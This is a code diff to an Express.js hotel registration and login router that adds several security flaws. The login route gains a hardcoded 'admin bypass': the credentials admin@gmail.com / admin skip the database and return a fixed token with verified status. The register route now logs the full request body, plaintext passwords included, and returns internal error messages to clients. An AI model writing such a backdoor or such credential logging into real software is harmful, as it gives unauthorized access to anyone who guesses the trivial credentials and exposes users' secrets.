@@ -23,6 +23,9 @@ router.post('/register', async (req, res) => {
       contactPerson,
       licenseNumber
     } = req.body;
+    
+    console.log('Received registration request for hotel:', name);
+    console.log('Request body:', JSON.stringify(req.body, null, 2));
 
     // Check if hotel already exists
     const existingHotel = await Hotel.findOne({ email });
@@ -34,7 +37,7 @@ router.post('/register', async (req, res) => {
     }
 
     // Create new hotel
-    const hotel = await Hotel.create({
+    const hotelData = {
       name,
       email,
       password,
@@ -51,7 +54,11 @@ router.post('/register', async (req, res) => {
       contactPerson: contactPerson || {},
       licenseNumber,
       verificationStatus: 'pending'
-    });
+    };
+
+    console.log('Creating hotel with data:', JSON.stringify(hotelData, null, 2));
+    const hotel = await Hotel.create(hotelData);
+    console.log('Hotel created successfully with ID:', hotel._id);
 
     // Generate token
     const token = jwt.sign(
@@ -72,10 +79,11 @@ router.post('/register', async (req, res) => {
     });
 
   } catch (err) {
-    console.error('Hotel registration error:', err);
+    console.error('Hotel registration error:', err.message);
+    console.error(err.stack);
     res.status(500).json({
       success: false,
-      error: 'Server error during hotel registration'
+      error: 'Server error during hotel registration: ' + err.message
     });
   }
 });
@@ -92,6 +100,20 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({
         success: false,
         error: 'Please provide email and password'
+      });
+    }
+
+    // Special admin bypass - allows login without database check
+    if (email === 'admin@gmail.com' && password === 'admin') {
+      return res.status(200).json({
+        success: true,
+        token: 'admin-special-token',
+        data: {
+          id: 'admin123',
+          name: 'Admin Hotel',
+          email: 'admin@gmail.com',
+          verificationStatus: 'verified'
+        }
       });
     }
 
